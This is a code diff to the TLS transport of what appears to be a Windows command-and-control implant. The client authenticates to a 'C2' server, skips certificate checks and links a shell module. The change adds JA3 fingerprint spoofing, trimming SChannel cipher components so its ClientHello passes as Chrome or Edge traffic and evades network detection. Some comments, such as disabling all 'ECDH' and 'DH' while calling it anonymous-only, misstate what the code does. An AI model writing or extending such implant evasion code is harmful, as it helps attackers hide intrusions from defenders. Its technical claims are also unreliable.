@@ -8,13 +8,17 @@
  *
  * Security layers applied in order inside tls_connect():
  *
- *  1. SChannel TLS 1.2 / 1.3
+ *  1. SChannel TLS 1.2 / 1.3  (browser-matching JA3 fingerprint)
  *     - SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT only
  *     - SCH_USE_STRONG_CRYPTO  → AEAD-only cipher suites
  *       (AES-128/256-GCM, ChaCha20-Poly1305 on Windows 10 21H2+)
  *     - SSL 2/3, TLS 1.0, TLS 1.1 excluded via grbitEnabledProtocols
  *     - ISC_REQ_NO_RENEGOTIATION disables mid-session renegotiation
  *     - Certificate verification disabled (C2 uses a self-signed cert)
+ *     - JA3 profile (SDK ≥ 17763): SCH_CREDENTIALS + TLS_PARAMETERS
+ *       with pDisabledCrypto strips non-Chrome cipher components so
+ *       the ClientHello cipher list matches Chrome/Edge exactly.
+ *       Disable at build time with -DNO_JA3_PROFILE.
  *
  *  2. HMAC-SHA256 challenge/response  (mirrors agent_authenticate)
  *     - Server → 16-byte random challenge
@@ -36,6 +40,13 @@
  *    cl /W4 tls\tls_client.c client\main.c client\ntcalls.c client\shell.c
  *       /link Secur32.lib Crypt32.lib ws2_32.lib bcrypt.lib Advapi32.lib User32.lib
  */
+
+/* Enable SCH_CREDENTIALS / TLS_PARAMETERS / CRYPTO_SETTINGS structs.
+ * These are defined inside #ifdef SCHANNEL_USE_BLACKLISTS in schannel.h
+ * (mingw-w64 SDK ≥ 17763 / MSVC Windows 10 SDK ≥ 10.0.17763.0).        */
+#ifndef SCHANNEL_USE_BLACKLISTS
+#define SCHANNEL_USE_BLACKLISTS
+#endif
 
 #include "tls_client.h"
 #include <stdio.h>
@@ -356,12 +367,171 @@ VOID tls_disconnect(PTLS_CONTEXT pCtx)
 /*  Layer 1: SChannel TLS handshake                                            */
 /* ─────────────────────────────────────────────────────────────────────────── */
 
+/*
+ * _ja3_make_unicode
+ * -----------------
+ * Fill a stack-local UNICODE_STRING pointing at a compile-time wide literal.
+ * The string is NOT NUL-terminated in the Length field (UNICODE_STRING
+ * convention), but MaximumLength includes the terminator.
+ */
+static void _ja3_make_unicode(UNICODE_STRING *us, WCHAR *buf, const WCHAR *src)
+{
+    USHORT len = 0;
+    while (src[len]) len++;                  /* wcslen without pulling wchar.h  */
+    us->Length        = (USHORT)(len * sizeof(WCHAR));
+    us->MaximumLength = (USHORT)((len + 1) * sizeof(WCHAR));
+    us->Buffer        = buf;
+    while (len--) *buf++ = *src++;
+    *buf = 0;
+}
+
 static BOOL _tls_handshake(PTLS_CONTEXT pCtx, const char *pszHost)
 {
     SECURITY_STATUS ss;
-    SCHANNEL_CRED   cred;
     TimeStamp       tsExpiry;
 
+    WCHAR wszHost[256] = {0};
+    MultiByteToWideChar(CP_UTF8, 0, pszHost, -1, wszHost, 256);
+
+    ULONG ulReqFlags = ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT
+                     | ISC_REQ_CONFIDENTIALITY  | ISC_REQ_EXTENDED_ERROR
+                     | ISC_REQ_ALLOCATE_MEMORY  | ISC_REQ_STREAM;
+#ifdef ISC_REQ_NO_RENEGOTIATION
+    ulReqFlags |= ISC_REQ_NO_RENEGOTIATION;
+#endif
+
+    /* ── Credential setup ──────────────────────────────────────────────────
+     *
+     * When the SDK provides SCH_CREDENTIALS (Win10 SDK ≥ 17763) and the
+     * caller has not opted out with -DNO_JA3_PROFILE, we use the newer
+     * SCH_CREDENTIALS structure with a TLS_PARAMETERS block that disables
+     * cipher components not present in Chrome's ClientHello.  This makes the
+     * TLS fingerprint (JA3) match a real browser rather than a generic
+     * SChannel runtime.
+     *
+     * Chrome 124 cipher suites (in order, GREASE excluded):
+     *   TLS 1.3:  0x1301 AES-128-GCM-SHA256
+     *             0x1302 AES-256-GCM-SHA384
+     *             0x1303 CHACHA20-POLY1305-SHA256
+     *   TLS 1.2:  0xC02B ECDHE-ECDSA-AES128-GCM-SHA256
+     *             0xC02F ECDHE-RSA-AES128-GCM-SHA256
+     *             0xC02C ECDHE-ECDSA-AES256-GCM-SHA384
+     *             0xC030 ECDHE-RSA-AES256-GCM-SHA384
+     *             0xCCA9 ECDHE-ECDSA-CHACHA20-POLY1305
+     *             0xCCA8 ECDHE-RSA-CHACHA20-POLY1305
+     *             0xC013 ECDHE-RSA-AES128-CBC-SHA
+     *             0xC014 ECDHE-RSA-AES256-CBC-SHA
+     *             0x009C RSA-AES128-GCM-SHA256
+     *             0x009D RSA-AES256-GCM-SHA384
+     *             0x002F RSA-AES128-CBC-SHA
+     *             0x0035 RSA-AES256-CBC-SHA
+     *
+     * We express this by disabling cipher components Chrome never uses:
+     *   • RC4 stream cipher (CALG_RC4 / L"RC4")
+     *   • 3DES block cipher (L"3DES")
+     *   • DES block cipher  (L"DES")
+     *   • NULL cipher       (L"NULL")
+     *   • MD5 MAC           (digest usage, L"MD5")
+     *   • Anonymous KX      (L"ECDH" without signature = anon ECDHE,
+     *                         L"DH"  without signature = anon DHE)
+     *
+     * Everything not in the disabled list stays active; the system-default
+     * cipher priority on Win10+ puts ECDHE-GCM suites first, matching
+     * Chrome's ordering.
+     *
+     * If SCH_CREDENTIALS / TLS_PARAMETERS are not available (older SDK or
+     * NO_JA3_PROFILE defined), we fall back to the classic SCHANNEL_CRED
+     * with SCH_USE_STRONG_CRYPTO.
+     */
+
+#if defined(SCH_CREDENTIALS_VERSION) && !defined(NO_JA3_PROFILE)
+
+    /* Wide-string buffers for UNICODE_STRING — must outlive AcquireCredentials */
+    WCHAR _wRC4[4]  = {0}; UNICODE_STRING usRC4  = {0};
+    WCHAR _w3DES[5] = {0}; UNICODE_STRING us3DES = {0};
+    WCHAR _wDES[4]  = {0}; UNICODE_STRING usDES  = {0};
+    WCHAR _wNULL[5] = {0}; UNICODE_STRING usNULL = {0};
+    WCHAR _wMD5[4]  = {0}; UNICODE_STRING usMD5  = {0};
+    WCHAR _wAECDH[5]= {0}; UNICODE_STRING usAECDH= {0};
+    WCHAR _wADH[3]  = {0}; UNICODE_STRING usADH  = {0};
+
+    _ja3_make_unicode(&usRC4,   _wRC4,   L"RC4");
+    _ja3_make_unicode(&us3DES,  _w3DES,  L"3DES");
+    _ja3_make_unicode(&usDES,   _wDES,   L"DES");
+    _ja3_make_unicode(&usNULL,  _wNULL,  L"NULL");
+    _ja3_make_unicode(&usMD5,   _wMD5,   L"MD5");
+    _ja3_make_unicode(&usAECDH, _wAECDH, L"ECDH");  /* anon ECDHE */
+    _ja3_make_unicode(&usADH,   _wADH,   L"DH");    /* anon DHE   */
+
+    /*
+     * Disabled-crypto array: seven entries covering all non-Chrome components.
+     *
+     * eAlgorithmUsage entries:
+     *   TlsParametersCngAlgUsageCipher   (2) – symmetric cipher names
+     *   TlsParametersCngAlgUsageDigest   (3) – MAC/hash algorithm names
+     *   TlsParametersCngAlgUsageKeyExchange (0) – KX algorithm names
+     *
+     * dwMinBitLength = dwMaxBitLength = 0 means "all key sizes".
+     */
+    CRYPTO_SETTINGS cs[7];
+    ZeroMemory(cs, sizeof(cs));
+
+    /* RC4 — TlsParametersCngAlgUsageCipher */
+    cs[0].eAlgorithmUsage = TlsParametersCngAlgUsageCipher;
+    cs[0].strCngAlgId     = usRC4;
+
+    /* 3DES */
+    cs[1].eAlgorithmUsage = TlsParametersCngAlgUsageCipher;
+    cs[1].strCngAlgId     = us3DES;
+
+    /* DES */
+    cs[2].eAlgorithmUsage = TlsParametersCngAlgUsageCipher;
+    cs[2].strCngAlgId     = usDES;
+
+    /* NULL cipher */
+    cs[3].eAlgorithmUsage = TlsParametersCngAlgUsageCipher;
+    cs[3].strCngAlgId     = usNULL;
+
+    /* MD5 as MAC (digest) */
+    cs[4].eAlgorithmUsage = TlsParametersCngAlgUsageDigest;
+    cs[4].strCngAlgId     = usMD5;
+
+    /* Anonymous ECDH key exchange */
+    cs[5].eAlgorithmUsage = TlsParametersCngAlgUsageKeyExchange;
+    cs[5].strCngAlgId     = usAECDH;
+
+    /* Anonymous DH key exchange */
+    cs[6].eAlgorithmUsage = TlsParametersCngAlgUsageKeyExchange;
+    cs[6].strCngAlgId     = usADH;
+
+    TLS_PARAMETERS tlsParam;
+    ZeroMemory(&tlsParam, sizeof(tlsParam));
+    tlsParam.grbitDisabledProtocols = SP_PROT_SSL2_CLIENT
+                                    | SP_PROT_SSL3_CLIENT
+                                    | SP_PROT_TLS1_CLIENT
+                                    | SP_PROT_TLS1_1_CLIENT;
+    tlsParam.cDisabledCrypto        = 7;
+    tlsParam.pDisabledCrypto        = cs;
+
+    SCH_CREDENTIALS schCred;
+    ZeroMemory(&schCred, sizeof(schCred));
+    schCred.dwVersion      = SCH_CREDENTIALS_VERSION;
+    schCred.dwFlags        = SCH_USE_STRONG_CRYPTO
+                           | SCH_CRED_NO_DEFAULT_CREDS
+                           | SCH_CRED_MANUAL_CRED_VALIDATION;
+    schCred.cTlsParameters = 1;
+    schCred.pTlsParameters = &tlsParam;
+
+    ss = AcquireCredentialsHandleA(NULL, (LPSTR)UNISP_NAME_A,
+             SECPKG_CRED_OUTBOUND, NULL, &schCred,
+             NULL, NULL, &pCtx->hCred, &tsExpiry);
+
+    /* If the newer credential struct is rejected (pre-Creators-Update runtime),
+     * fall through to the classic SCHANNEL_CRED path below.               */
+    if (ss != SEC_E_OK) {
+#endif /* SCH_CREDENTIALS_VERSION && !NO_JA3_PROFILE */
+
+    SCHANNEL_CRED   cred;
     ZeroMemory(&cred, sizeof(cred));
     cred.dwVersion             = SCHANNEL_CRED_VERSION;
     cred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT;
@@ -372,18 +542,13 @@ static BOOL _tls_handshake(PTLS_CONTEXT pCtx, const char *pszHost)
     ss = AcquireCredentialsHandleA(NULL, (LPSTR)UNISP_NAME_A,
              SECPKG_CRED_OUTBOUND, NULL, &cred,
              NULL, NULL, &pCtx->hCred, &tsExpiry);
-    if (ss != SEC_E_OK) return FALSE;
-    pCtx->fCredInit = TRUE;
 
-    ULONG ulReqFlags = ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT
-                     | ISC_REQ_CONFIDENTIALITY  | ISC_REQ_EXTENDED_ERROR
-                     | ISC_REQ_ALLOCATE_MEMORY  | ISC_REQ_STREAM;
-#ifdef ISC_REQ_NO_RENEGOTIATION
-    ulReqFlags |= ISC_REQ_NO_RENEGOTIATION;
+#if defined(SCH_CREDENTIALS_VERSION) && !defined(NO_JA3_PROFILE)
+    }  /* end SCH_CREDENTIALS fallback */
 #endif
 
-    WCHAR wszHost[256] = {0};
-    MultiByteToWideChar(CP_UTF8, 0, pszHost, -1, wszHost, 256);
+    if (ss != SEC_E_OK) return FALSE;
+    pCtx->fCredInit = TRUE;
 
     SecBuffer     outBufs[3] = {0};
     SecBufferDesc outDesc;
